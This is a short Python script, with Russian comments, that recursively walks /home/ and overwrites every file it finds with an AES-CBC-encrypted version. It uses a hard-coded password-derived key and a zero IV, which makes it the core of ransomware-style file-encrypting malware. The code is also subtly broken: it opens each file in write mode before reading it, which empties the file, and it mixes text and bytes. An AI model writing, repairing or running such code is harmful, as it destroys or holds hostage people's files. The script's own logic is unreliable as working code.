#!/usr/bin/python3

from Crypto.Cipher import AES
import hashlib
import os
def crypt():
    global path
    
    password = '0101010001101000011010010111001100100000011010010111001100100000010100110101000001010010010011110100111101010100'.encode()  # или b убрать и поставить .decode()
    key = hashlib.sha256(password).digest()
    mode = AES.MODE_CBC
    IV = 16 * '\x00'
    cipher = AES.new(key,mode,IV)
    def pad_message(path):
        while len(path) % 16 != 0:
                path = path  + b'\x8a\xfe\xa7aY}\xa3It=\xc3\xccT\xc8\xd8\xba\x9e\xf8\xec&\xf0'
        return path
    
    with open(path, 'w') as f:
        orig_file = f.read()
    padded_message = pad_message(orig_file)
    encrypt_message = cipher.encrypt(padded_message)
    with open(path, 'wb') as e:
        e.write(encrypt_message)


def walking_dir(dir):
    global path
    # Перебираем все поддиректории в указаной директории
    try:
        try:
            for name in os.listdir(dir):
                path = os.path.join(dir, name)
                print(path)
                if os.path.isfile(path):
                    print(path)
                    crypt()
                else:
                    walking_dir(path)
        except NotADirectoryError as msg:
            #root = os.chdir(path)
            print(str(msg))

                
    except FileNotFoundError as f:
        print(str(f))
walking_dir('/home/')
